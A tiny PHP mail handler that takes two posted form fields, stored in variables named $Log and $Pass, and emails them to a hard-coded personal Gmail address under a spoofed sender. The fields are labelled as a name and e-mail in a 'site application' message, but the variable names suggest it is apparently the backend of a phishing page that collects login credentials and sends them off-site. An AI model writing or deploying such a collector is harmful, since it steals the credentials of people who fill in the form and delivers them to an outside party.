<?PHP
$Log = $_POST['counter'];
$Pass = $_POST['strike'];

mail("dimasikskorohodcik@gmail.com", "Заявка с сайта", "ФИО:".$Log.". E-mail: ".$Pass ,"From: example2@mail.ru \r\n");


?>
